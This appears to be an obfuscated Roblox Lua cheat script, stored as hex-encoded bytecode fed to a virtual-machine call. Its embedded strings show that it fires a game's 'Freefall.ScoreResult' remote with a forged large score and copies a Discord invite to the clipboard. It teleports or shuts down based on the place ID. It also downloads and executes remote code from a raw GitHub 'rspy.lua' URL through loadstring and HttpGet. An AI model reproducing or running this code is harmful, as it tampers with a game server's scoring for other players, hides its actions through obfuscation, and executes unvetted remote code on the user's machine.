004013Q004E000100121E3Q00054Q0022000100033Q00260C3Q0014000100060004013Q0014000100021800045Q00101F00010007000400120B000400083Q000218000500014Q000E0004000200052Q0005000300054Q0005000200043Q00121E3Q00093Q000E070009002800013Q0004013Q002800010006120002001C00013Q0004013Q001C000100120B0004000A3Q00121E0005000B4Q001A0004000200010004013Q0020000100120B0004000C3Q00121E0005000D4Q0005000600034Q002000040006000100120B0004000E3Q001213000500013Q00202Q00050005000F00122Q000700106Q000500076Q00043Q00024Q00040001000100124Q00113Q00260C3Q0039000100050004013Q0039000100120B000400013Q0020190004000400122Q000A00040002000200061100040033000100010004013Q0033000100120B000400013Q0020230004000400130020190004000400142Q001A00040002000100120B000400153Q00200300040004001600122Q000500176Q0004000200024Q000100043Q00124Q00063Q00260C3Q000A000100110004013Q000A000100120B000400013Q00200200040004001800122Q000600196Q00040006000200202Q00040004001A00122Q0006001B6Q00073Q000700302Q0007001C001D00302Q0007001E001F00122Q000800213Q00202Q00080008002200101F00070020000800302Q00070023002400302Q00070025002600302Q00070027002800102Q0007002900014Q00040007000100044Q004E00010004013Q000A00012Q00093Q00013Q00023Q00193Q002Q033Q00596573028Q00030C3Q00736574636C6970626F617264031D3Q00682Q7470733A2Q2F646973636F72642E2Q672F6D62667742375078413503043Q0067616D6503073Q00506C6163654964023Q000F2F2Q014203073Q00506C6179657273030B3Q004C6F63616C506C61796572030A3Q0047657453657276696365030F3Q0054656C65706F72745365727669636503083Q0054656C65706F7274022Q0020141B98064203113Q005265706C69636174656453746F72616765030E3Q0046696E6446697273744368696C642Q033Q006C696203073Q004E6574776F726B03143Q0046722Q6566612Q6C2E53636F7265526573756C74030A3Q0046697265536572766572024Q0080841E4103043Q007761726E03203Q0053636F7265526573756C74206E6F7420666F756E6420696E204E6574776F726B032D3Q004E6574776F726B206F72206C6962206E6F7420666F756E6420696E205265706C69636174656453746F7261676503023Q004E6F03083Q0053687574646F776E01533Q00260C3Q004D000100010004013Q004D000100121E000100023Q00260C00010003000100020004013Q0003000100120B000200033Q001204000300046Q00020002000100122Q000200053Q00202Q00020002000600262Q00020018000100070004013Q0018000100120B000200053Q00201D00020002000800202Q00020002000900122Q000300053Q00202Q00030003000A00122Q0005000B6Q00030005000200202Q00030003000C00122Q0005000D6Q000600026Q00030006000100044Q0052000100120B000200053Q00202300020002000600260C000200520001000D0004013Q0052000100121E000200024Q0022000300033Q00260C0002001E000100020004013Q001E000100120B000400053Q00201C00040004000A00122Q0006000E6Q00040006000200202Q00040004000F00122Q000600106Q0004000600024Q000300043Q00062Q0003004500013Q0004013Q0045000100201900040003000F00121E000600114Q00170004000600020006120004004500013Q0004013Q0045000100121E000400024Q0022000500053Q00260C00040031000100020004013Q0031000100202300060003001100200800060006000F00122Q000800126Q0006000800024Q000500063Q00062Q0005003F00013Q0004013Q003F000100201900060005001300121E000800143Q00121E000900144Q00200006000900010004013Q0052000100120B000600153Q00121E000700164Q001A0006000200010004013Q005200010004013Q003100010004013Q0052000100120B000400153Q00121E000500174Q001A0004000200010004013Q005200010004013Q001E00010004013Q005200010004013Q000300010004013Q0052000100260C3Q0052000100180004013Q0052000100120B000100053Q0020190001000100192Q001A0001000200012Q00093Q00017Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F496D616C7769626573742F496D616C7769626573742F726566732F68656164732F6D61696E2F727370792E6C7561000A3Q0012063Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000400016Q000100049Q0000026Q00019Q008Q00017Q00", v9(), ...);
